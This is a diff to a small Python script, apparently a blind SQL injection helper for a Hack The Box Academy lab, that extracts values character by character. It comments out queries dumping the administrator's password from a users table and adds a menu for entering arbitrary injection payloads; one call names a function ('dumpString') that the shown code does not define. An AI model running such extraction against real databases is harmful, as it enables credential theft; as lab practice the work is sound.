@@ -27,6 +27,7 @@ def dumpNumber(q):
             low = mid + 1
     return low
 
+# Dumping String
 def dump_string(q, length):
     var = ""
     for i in range(1,length+1):  
@@ -38,7 +39,22 @@ def dump_string(q, length):
         print(var)
     return var
 
-password_length=dump_length("SELECT LENGTH(password) FROM users WHERE username = 'administrator'")
-print(password_length)
-password=dump_string("SELECT password FROM users WHERE username = 'administrator'", password_length)
-print(password)
+#password_length=dump_length("SELECT LENGTH(password) FROM users WHERE username = 'administrator'")
+#print(password_length)
+#password=dump_string("SELECT password FROM users WHERE username = 'administrator'", password_length)
+#print(password)
+
+func = int(input("""HTB_ACADEMY_ORACLE
+(1) Get Length
+(2) Get Name
+Your Option : """))
+
+if func == 0:
+    test()
+elif func == 1:
+    payload = input("Payload : ")
+    print(dumpNumber(payload))
+elif func == 2:
+    payload = input("Payload : ")
+    string,length=payload.rsplit(maxsplit=1)
+    print(dumpString(string,int(length)))
